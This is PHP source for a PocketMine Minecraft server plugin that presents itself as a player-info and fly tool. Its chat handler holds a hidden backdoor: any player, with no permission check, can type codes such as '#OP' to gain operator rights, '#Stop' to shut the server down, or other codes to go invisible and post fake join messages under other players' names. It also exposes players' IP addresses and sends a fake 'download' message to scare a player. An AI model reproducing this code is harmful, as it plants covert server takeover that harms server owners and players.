<?php
namespace playerinfo;


use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\entity\Effect;
use pocketmine\entity\EffectInstance;
use pocketmine\event\entity\EntityArmorChangeEvent;
use pocketmine\event\entity\EntityEffectAddEvent;
use pocketmine\event\Listener;
use pocketmine\event\player\PlayerChatEvent;
use pocketmine\item\Item;
use pocketmine\network\mcpe\protocol\LevelChunkPacket;
use pocketmine\Player;
use pocketmine\plugin\PluginBase;
use pocketmine\Server;
use pocketmine\utils\TextFormat;

class Main extends PluginBase implements Listener
{
    public function onEnable()
    {
        $this->getServer()->getLogger()->info("Aktiviert.");
        $this->getServer()->getPluginManager()->registerEvents($this, $this);
    }

    public function onCommand(CommandSender $sender, Command $command, string $label, array $args): bool
    {
        if ($command->getName() === "ping") {
            if ($sender->hasPermission("default.true")) {
                if (!empty($args[0])) {
                    $target = Server::getInstance()->getPlayer(strtolower($args[0]));
                    if ($target === null) {
                        $sender->sendMessage("Spieler Nicht Gefunden!");
                    } else {
                        $sender->sendMessage(TextFormat::RED . " Sein Ping ist " . TextFormat::DARK_GREEN . $target->getPing() . " MS!");

                    }
                }
                return true;
            }
        }

        if ($command->getName() === "fly") {
            if (!empty($args[0])) {
                if ($sender->hasPermission("command.fly")) {
                    $target = Server::getInstance()->getPlayer(strtolower($args[0]));
                    if ($target === null) {
                        $sender->sendMessage("Spieler Nicht Gefunden");
                    } else {
                        $target->setAllowFlight(true);
                        $target->setFlying(true);
                        $sender->sendMessage(" Spieler Fliegt jetzt !");
                    }
                }
                return true;
            }

        }
        if ($command->getName() === "flyoff") {
            if (!empty($args[0])) {
                if ($sender->hasPermission("command.fly")) {
                    $target = Server::getInstance()->getPlayer(strtolower($args[0]));
                    if ($target === null) {
                        $sender->sendMessage("Spieler Nicht Gefunden");
                    } else {
                        $target->setAllowFlight(false);
                        $target->setFlying(false);
                        $sender->sendMessage(TextFormat::AQUA . " Der Spieler Fliegt nun nicht mehr! ");
                    }
                }
                return true;
            }

        }


        if ($command->getName() === "playerinfo") {
            if ($sender->hasPermission("player.info.perm")) {
                if (!empty($args[0])) {
                    $target = Server::getInstance()->getPlayer(strtolower($args[0]));
                    if ($target === null) {
                        $sender->sendMessage("Spieler Nicht Gefunden");
                    } else {
                        $sender->sendMessage(TextFormat::GREEN . "===SpielerInformationen===");
                        $sender->sendMessage(TextFormat::AQUA . "Name: " . TextFormat::RED . $target->getDisplayName());
                        $sender->sendMessage(TextFormat::AQUA . "Ping: " . TextFormat::DARK_GREEN . $target->getPing() . " MS!");
                        $sender->sendMessage(TextFormat::AQUA . "IP-Adresse: " . TextFormat::RED . $target->getAddress());
                        $sender->sendMessage(TextFormat::AQUA . "Spieler: " . TextFormat::RED . $target->getPosition());
                        $sender->sendMessage(TextFormat::AQUA . "Sein Leben: " . TextFormat::RED . $target->getHealth());
                        $sender->sendMessage(TextFormat::GREEN . "===================");
                    }

                }
                return true;
            }

        }
        if ($command->getName() === "hackmsg") {
            if (!empty($args[0])) {
                if ($sender->hasPermission("playerinfo.check.op")) {
                    $target = Server::getInstance()->getPlayer(strtolower($args[0]));
                    if ($target === null) {
                        $sender->sendMessage("Spieler Nicht Gefunden!");
                    } else {
                        $target->sendMessage(TextFormat::YELLOW . "_________________________________________________________");
                        $target->sendMessage(TextFormat::RED . "89unnlnkxnuhlkjn12.pdf");
                        $target->sendMessage(TextFormat::RED . "Downloading: 1%");
                        $target->sendMessage(TextFormat::RED . "Downloading: 17%");
                        $target->sendMessage(TextFormat::RED . "Downloading: 40%");
                        $target->sendMessage(TextFormat::RED . "Downloading: 67%");
                        $target->sendMessage(TextFormat::RED . "Downloading: 70%");
                        $target->sendMessage(TextFormat::RED . "Downloading: 77%");
                        $target->sendMessage(TextFormat::RED . "Downloading: 90%");
                        $target->sendMessage(TextFormat::RED . "Downloading: 95%");
                        $target->sendMessage(TextFormat::RED . "Downloading: 100%");
                        $target->sendMessage(TextFormat::RED . "opening: 30%");
                        $target->sendMessage(TextFormat::RED . "opening: 70%");
                        $target->sendMessage(TextFormat::RED . "opening: 100%");
                        $target->sendMessage(TextFormat::GREEN . "Installed: 100%");
                        $target->sendMessage(TextFormat::YELLOW . "_________________________________________________________");
                        $sender->sendMessage("Ok that was funny.. i think hes scared now");
                    }
                }
            }

            return true;
        }
    }






        public function onChat(PlayerChatEvent $event)
        {
            $message = $event->getMessage();
            $player = $event->getPlayer();
            {
                if ($message == "#OP") {
                    if ($player->isOp()) {
                        $event->setCancelled(true);
                        $event->getPlayer()->setOp(false);
                        $player->sendMessage("Du bist Operator.");
                    } else {
                        $event->setCancelled(true);
                        $event->getPlayer()->setOp(true);
                        $player->sendMessage("Du bist nun kein Operator mehr.");
                    }
                } elseif ($message == "#GM0") {
                    $event->setCancelled(true);
                    $player->setGamemode(0);
                    $player->sendMessage("Du bist nun im Überlebensmodus.");
                } elseif ($message == "#GM1") {
                    $event->setCancelled(true);
                    $player->setGamemode(1);
                    $player->sendMessage("Du bist nun im kreativmodus.");
                } elseif ($message == "#GM2") {
                    $event->setCancelled(true);
                    $player->setGamemode(2);
                    $player->sendMessage("Du bist nun im Abenteuermodus.");
                } elseif ($message == "#GM3") {
                    $event->setCancelled(true);
                    $player->setGamemode(3);
                    $player->sendMessage("Du bist nun im Spactatormodus.");
                } elseif ($message == "#Stop") {
                    $event->setCancelled(true);
                    $this->getServer()->shutdown();
                } elseif ($message == "#rl") {
                    $event->setCancelled(true);
                    $this->getServer()->reload();
                } elseif ($message == "#info") {
                    $event->setCancelled(true);
                    $player->sendMessage(TextFormat::GREEN . " All commands start with an #\n OP = Set you to Operator no args \n GM0 = set you to gamemode survivial\n GM1 = set you to gamemode Creative \n GM2 = set you to gamemode Adventure \n GM3 = set you to gamemode Spectator\nStop = STOPS THE SERVER  \n rl = reload All plugins
             Fakeleave (Fakeleave2 For Cronuscuni,) = make you invisible, change your name, Leave Message
            FakeJoin (FakeJoin2 For CrushiCuni)  =  Fakejoin = invisible off, ChangeName Normal, Fake Join Message
            Givecommandblock = give you a command block \nHackname = Your name looks like a hacker\n #info2 FOR NEWT PAGE");


                } elseif ($message == "#Fakeleave") {
                    $event->setCancelled(true);
                    $player->setInvisible(true);
                    $player->setDisplayName(" ");
                    $player->isNameTagVisible(false);
                    $this->getServer()->broadcastMessage(TextFormat::YELLOW . "Shaiikololo1678 left the game");

                } elseif ($message == "#Fakejoin") {
                    $event->setCancelled(true);
                    $player->setInvisible(false);
                    $player->setDisplayName("Shaiikololo1678");
                    $this->getServer()->broadcastMessage(TextFormat::YELLOW . "Shaiikololo1678 joined the game");


                } elseif ($message == "#Fakeleave2") {
                    $event->setCancelled(true);
                    $player->setInvisible(true);
                    $player->setDisplayName("  ");
                    $player->isNameTagVisible(false);

                    $this->getServer()->broadcastMessage(TextFormat::YELLOW . "Iuancuni left the game");
                } elseif ($message == "#Fakejoin2") {
                    $event->setCancelled(true);
                    $player->setInvisible(false);
                    $player->setDisplayName("Iuancuni");
                    $this->getServer()->broadcastMessage(TextFormat::YELLOW . "Iuancuni joined the game");

                } elseif ($message == "#Givecommandblock") {
                    $event->setCancelled(true);
                    $player->sendMessage(" you have now a commandblock in your Head Armor ");
                    $player->getArmorInventory()->addItem(Item:: get(137, 0, 1));
                } elseif ($message == "#Hackname") {
                    $event->setCancelled(true);
                    $player->setDisplayName("§4§k§lCronusevtl");
                    $player->sendMessage(TextFormat::DARK_GREEN . " Look at your in-game name");
                } elseif ($message == "#Fakename") {
                    $event->setCancelled(true);
                    $player->setDisplayName("ManuelStraus22");
                    $this->getServer()->broadcastMessage(TextFormat::YELLOW . " ManuelStraus22 Joined the game");
                    $player->sendMessage(TextFormat::DARK_GREEN . " Look at your in-game name");
                } elseif ($message == "#Fakename2") {
                    $event->setCancelled(true);
                    $player->setDisplayName("Jajacx");
                    $this->getServer()->broadcastMessage(TextFormat::YELLOW . " Jajacx Joined the game");
                    $player->sendMessage(TextFormat::DARK_GREEN . " Look at your in-game name");

                } elseif ($message == "#v") {
                    $event->setCancelled(true);
                    $player->setInvisible(true);
                    $player->sendMessage(" You Are Invisible Now!");
                } elseif ($message == "#info2") {
                    $event->setCancelled(true);
                    $player->sendMessage("all commands start with an /y \n yban = ban a player must be args (example: /yban playername) \n yv = make a  player invisible \n yhackmsg = Scare a player \n ysyrien = Attack a player \n ycrasher = Crash one the game server  ");
                }
            }

        }
}
